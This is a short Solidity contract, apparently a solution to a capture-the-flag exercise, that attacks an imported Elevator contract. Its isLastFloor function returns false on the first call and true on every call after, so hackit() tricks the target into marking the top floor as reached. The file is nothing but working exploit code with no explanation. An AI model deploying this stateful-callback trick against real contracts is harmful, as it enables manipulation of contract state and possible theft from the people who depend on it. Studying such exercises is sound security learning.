// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract Evil12 {
    Elevator target;

    bool public flag = false;

    constructor(address payable _target) public {
        target = Elevator(_target);
    }

    function isLastFloor(uint) external returns(bool) {
      if(!flag) {
        flag = true;
        return false;
      }
      return true;
    }

    function hackit() external {
        target.goTo(1);
    }
}